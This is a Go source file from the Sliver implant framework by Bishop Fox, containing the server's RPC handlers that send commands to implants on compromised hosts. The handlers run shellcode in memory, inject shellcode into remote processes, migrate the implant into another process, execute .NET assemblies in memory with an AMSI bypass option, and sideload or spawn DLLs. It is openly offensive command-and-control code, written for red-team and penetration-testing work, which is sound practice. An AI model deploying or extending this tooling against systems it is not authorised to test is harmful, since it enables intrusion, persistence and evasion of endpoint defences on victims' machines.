package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"path"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/assets"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

// Task - Execute shellcode in-memory
func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.Task, error) {
	resp := &sliverpb.Task{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RemoteTask - Inject and execute shellcode in a remote process
func (rpc *Server) RemoteTask(ctx context.Context, req *sliverpb.RemoteTaskReq) (*sliverpb.Task, error) {
	resp := &sliverpb.Task{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Migrate - Migrate to a new process on the remote system (Windows only)
func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	config := generate.ImplantConfigFromProtobuf(req.Config)
	config.Format = clientpb.ImplantConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		return nil, err
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		return nil, err
	}
	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
		Request: req.Request,
		Data:    shellcode,
		Pid:     req.Pid,
	})
	if err != nil {
		return nil, err
	}
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgInvokeMigrateReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.Migrate{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	// We have to add the hosting DLL to the request before forwarding it to the implant
	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		return nil, err
	}
	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		Request:    req.Request,
		Assembly:   req.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  req.Arguments,
		Process:    req.Process,
		AmsiBypass: req.AmsiBypass,
	})
	if err != nil {
		return nil, err
	}

	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.ExecuteAssembly{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Sideload - Sideload a DLL on the remote system (Windows only)
func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	var err error
	var respData []byte
	timeout := rpc.getTimeout(req)
	switch session.ToProtobuf().GetOS() {
	case "windows":
		shellcode, err := generate.ShellcodeRDIFromBytes(req.Data, req.EntryPoint, req.Args)
		if err != nil {
			return nil, err
		}
		data, err := proto.Marshal(&sliverpb.SideloadReq{
			Request:  req.Request,
			Data:     shellcode,
			ProcName: req.ProcName,
		})
		if err != nil {
			return nil, err
		}
		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, data)
	case "darwin":
		fallthrough
	case "linux":
		reqData, err := proto.Marshal(req)
		if err != nil {
			return nil, err
		}
		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, reqData)
	default:
		err = fmt.Errorf("%s does not support sideloading", session.ToProtobuf().GetOS())
	}
	if err != nil {
		return nil, err
	}

	resp := &sliverpb.Sideload{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// SpawnDll - Spawn a DLL on the remote system (Windows only)
func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.SpawnDllReq) (*sliverpb.SpawnDll, error) {
	resp := &sliverpb.SpawnDll{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}
